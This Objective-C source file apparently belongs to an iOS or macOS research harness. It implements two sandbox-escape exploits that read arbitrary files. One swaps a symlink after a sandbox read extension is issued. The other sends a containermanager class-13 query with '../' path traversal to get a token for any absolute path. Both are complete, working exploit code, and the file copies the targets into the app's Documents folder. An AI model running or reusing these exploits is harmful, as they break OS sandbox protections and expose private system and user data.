//
//  SandboxRead.m — see header. The P116 v3 harness, lifted verbatim.
//

#import "SandboxRead.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdio.h>
#import <xpc/xpc.h>

typedef char *(*sbx_issue_t)(const char *, const char *, uint64_t);
typedef int64_t (*sbx_consume_t)(const char *);
typedef void (*sbx_release_t)(int64_t);

static sbx_issue_t   i_issue;
static sbx_consume_t i_consume;
static sbx_release_t i_release;

static BOOL sbx_load(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        i_issue   = (sbx_issue_t)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
        i_consume = (sbx_consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        i_release = (sbx_release_t)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return i_issue && i_consume;
}

/// binary heuristic shared with the string path
static BOOL looksBinary(NSData *d) {
    if (d.length == 0) return NO;
    const uint8_t *b = d.bytes;
    NSUInteger n = MIN(d.length, (NSUInteger)1024);
    for (NSUInteger i = 0; i < n; i++) if (b[i] == 0) return YES;
    return NO;
}

static NSArray<NSString *> *sbx_workfiles(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *work = [docs stringByAppendingPathComponent:@"sbx_work"];
    [[NSFileManager defaultManager] createDirectoryAtPath:work
        withIntermediateDirectories:YES attributes:nil error:nil];
    return @[work, [work stringByAppendingPathComponent:@"s"],
                 [work stringByAppendingPathComponent:@"l"]];
}

// ---------------------------------------------------------------------------
// v2 SECOND ENGINE — class-13 part-domain traversal.
// Technique from terminal_worse (git.jbjflab.top/admin/terminal_worse, GPL-3.0;
// Veilpath / bad_query lineage). An MCM container_query class 13 (system-group)
// with operation part 3 and a part_domain of relative ".." hops to the target
// makes containermanager issue a sandbox token for ANY absolute path — a lane
// independent of the P116 issue/swap/consume harness. Proven on 24A446/27.0.1.
// ---------------------------------------------------------------------------
typedef void *(*sbx_qcreate_t)(void);
typedef void (*sbx_qset_class_t)(void *, uint64_t);
typedef void (*sbx_qset_ids_t)(void *, void *);
typedef void (*sbx_qset_flags_t)(void *, uint64_t);
typedef void (*sbx_qset_part_t)(void *, uint64_t);
typedef void (*sbx_qset_domain_t)(void *, const char *);
typedef void *(*sbx_qresult_t)(void *);
typedef void (*sbx_qfree_t)(void *);
typedef char *(*sbx_copytoken_t)(void *);

static int64_t sbx_class13_handle(NSString *target, BOOL altFlags) {
    if (target.length == 0 || ![target hasPrefix:@"/"]) return -255;
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    sbx_qcreate_t qcreate = (sbx_qcreate_t)dlsym(mgr, "container_query_create");
    sbx_qset_class_t qclass = (sbx_qset_class_t)dlsym(mgr, "container_query_set_class");
    sbx_qset_ids_t qids = (sbx_qset_ids_t)dlsym(mgr, "container_query_set_group_identifiers");
    sbx_qset_flags_t qflags = (sbx_qset_flags_t)dlsym(mgr, "container_query_operation_set_flags");
    sbx_qset_part_t qpart = (sbx_qset_part_t)dlsym(mgr, "container_query_operation_set_part");
    sbx_qset_domain_t qdomain = (sbx_qset_domain_t)dlsym(mgr, "container_query_operation_set_part_domain");
    sbx_qresult_t qresult = (sbx_qresult_t)dlsym(mgr, "container_query_get_single_result");
    sbx_qfree_t qfree = (sbx_qfree_t)dlsym(mgr, "container_query_free");
    sbx_copytoken_t copytoken = (sbx_copytoken_t)dlsym(mgr, "container_copy_sandbox_token");
    sbx_consume_t consume = (sbx_consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!qcreate || !qclass || !qids || !qflags || !qpart || !qdomain ||
        !qresult || !qfree || !copytoken || !consume) { dlclose(mgr); return -1; }

    void *query = qcreate();
    if (!query) { dlclose(mgr); return -3; }
    void *ident = (__bridge void *)xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    qclass(query, 13);
    qids(query, ident);
    qpart(query, 3);
    char *part = NULL;
    if (asprintf(&part, "../../../../../../../..%s", target.fileSystemRepresentation) == -1) {
        qfree(query); dlclose(mgr); return -5;
    }
    qdomain(query, part);
    qflags(query, altFlags ? 0x0000000800000000ULL : 0x0000008000000000ULL);
    void *result = qresult(query);
    if (!result) { free(part); qfree(query); dlclose(mgr); return -5; }
    char *token = copytoken(result);
    if (!token) { free(part); qfree(query); dlclose(mgr); return -6; }
    int64_t handle = consume(token);
    free(token);
    free(part);
    qfree(query);
    dlclose(mgr);
    return handle;
}

static NSData *sbx_class13_data(NSString *target, NSUInteger maxBytes) {
    /* try both proven flag shapes; first live handle wins */
    int64_t h = sbx_class13_handle(target, NO);
    if (h < 0) h = sbx_class13_handle(target, YES);
    if (h < 0) return nil;
    int fd = open(target.fileSystemRepresentation, O_RDONLY);
    if (fd < 0) {
        sbx_release_t rel = (sbx_release_t)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
        if (rel) rel(h);
        return nil;
    }
    NSMutableData *data = [NSMutableData data];
    uint8_t buf[16384];
    ssize_t r;
    while ((r = read(fd, buf, sizeof buf)) > 0 && data.length < maxBytes) {
        NSUInteger take = MIN((NSUInteger)r, maxBytes - data.length);
        [data appendBytes:buf length:take];
    }
    close(fd);
    sbx_release_t rel = (sbx_release_t)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(h);
    return data;
}

@implementation LabSandboxRead

+ (NSString *)read:(NSString *)target maxBytes:(NSUInteger)maxBytes {
    if (!sbx_load() || target.length == 0) return nil;
    NSArray<NSString *> *w = sbx_workfiles();
    const char *s = w[1].fileSystemRepresentation;
    const char *l = w[2].fileSystemRepresentation;
    unlink(l);
    if (symlink(s, l) != 0) return nil;
    char *tok = i_issue("com.apple.app-sandbox.read", l, 0);
    if (!tok) return nil;
    unlink(l);
    if (symlink(target.fileSystemRepresentation, l) != 0) {
        memset(tok, 0, strlen(tok)); free(tok); return nil;
    }
    int64_t h = i_consume(tok);
    memset(tok, 0, strlen(tok)); free(tok);
    if (h <= 0) return nil;
    NSMutableData *data = [NSMutableData data];
    int fd = open(l, O_RDONLY);
    if (fd >= 0) {
        uint8_t buf[16384];
        ssize_t r;
        while ((r = read(fd, buf, sizeof buf)) > 0 && data.length < maxBytes) {
            NSUInteger take = MIN((NSUInteger)r, maxBytes - data.length);
            [data appendBytes:buf length:take];
        }
        close(fd);
    }
    if (i_release) i_release(h);
    if (data.length == 0) {
        /* v2: second engine — class-13 part-domain traversal */
        NSData *d13 = sbx_class13_data(target, maxBytes);
        if (d13.length) data = [d13 mutableCopy];
    }
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]
        ?: (looksBinary(data) ? [NSString stringWithFormat:@"[binary %lu B — use dump]",
             (unsigned long)data.length] : nil);
}

+ (NSDictionary *)dumpIntoDocuments:(NSString *)target {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (!sbx_load() || target.length == 0)
        return @{@"path": [NSNull null], @"bytes": @0, @"error": @"harness unavailable"};
    NSArray<NSString *> *w = sbx_workfiles();
    const char *s = w[1].fileSystemRepresentation;
    const char *l = w[2].fileSystemRepresentation;
    unlink(l);
    if (symlink(s, l) != 0)
        return @{@"path": [NSNull null], @"bytes": @0, @"error": @"symlink setup failed"};
    char *tok = i_issue("com.apple.app-sandbox.read", l, 0);
    if (!tok)
        return @{@"path": [NSNull null], @"bytes": @0, @"error": @"issue refused"};
    unlink(l);
    if (symlink(target.fileSystemRepresentation, l) != 0) {
        memset(tok, 0, strlen(tok)); free(tok);
        return @{@"path": [NSNull null], @"bytes": @0, @"error": @"swap failed"};
    }
    int64_t h = i_consume(tok);
    memset(tok, 0, strlen(tok)); free(tok);
    if (h <= 0)
        return @{@"path": [NSNull null], @"bytes": @0, @"error": @"consume refused"};
    long long total = 0;
    int fd = open(l, O_RDONLY);
    NSString *outPath = nil;
    if (fd >= 0) {
        outPath = [docs stringByAppendingPathComponent:
            [@"sbx_" stringByAppendingString:target.lastPathComponent]];
        int ofd = open(outPath.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (ofd >= 0) {
            static uint8_t buf[1 << 20];
            ssize_t r;
            while ((r = read(fd, buf, sizeof buf)) > 0) {
                ssize_t off = 0;
                while (off < r) {
                    ssize_t wr = write(ofd, buf + off, (size_t)(r - off));
                    if (wr <= 0) break;
                    off += wr;
                }
                total += r;
                if (total > (256LL << 20)) break;
            }
            fcntl(ofd, F_FULLFSYNC);
            close(ofd);
        } else {
            outPath = nil;
        }
        close(fd);
    } else {
        total = 0;
    }
    if (i_release) i_release(h);
    if (total == 0 || !outPath) {
        /* v2: second engine — class-13 part-domain traversal */
        NSData *d13 = sbx_class13_data(target, 256u << 20);
        if (d13.length) {
            outPath = [docs stringByAppendingPathComponent:
                [@"sbx_" stringByAppendingString:target.lastPathComponent]];
            if ([d13 writeToFile:outPath atomically:YES]) {
                return @{@"path": outPath, @"bytes": @(d13.length),
                         @"engine": @"class13", @"error": [NSNull null]};
            }
        }
    }
    if (total > 0 && outPath)
        return @{@"path": outPath, @"bytes": @(total), @"engine": @"p116", @"error": [NSNull null]};
    return @{@"path": [NSNull null], @"bytes": @(total), @"error": @"both engines refused"};
}

@end
